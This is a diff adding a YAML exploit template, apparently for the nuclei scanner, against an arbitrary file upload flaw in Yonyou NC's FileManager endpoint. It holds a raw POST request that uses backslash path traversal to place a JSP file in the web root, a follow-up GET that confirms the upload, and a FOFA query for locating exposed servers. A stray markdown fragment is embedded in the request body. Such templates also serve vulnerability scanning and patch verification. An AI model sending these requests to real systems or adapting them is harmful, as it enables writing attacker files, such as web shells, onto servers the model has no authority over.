@@ -1,0 +1,45 @@
+id: poc-ramqbc2cy3393sqi
+info:
+  name: 用友NC upload FileManager存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ramqbc2cy3393sqi'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ramqbc2cy3393sqi
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+
+
+    --d0b7a0d40eed0e32904c8017b09eb305
+
+    Content-Disposition: form-data; name="file"; filename="test123.jsp"
+
+    Content-Type: text/plain
+
+
+    Test123
+
+    --d0b7a0d40eed0e32904c8017b09eb305--
+
+
+    **验证地址：**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - GET /test123.jsp HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
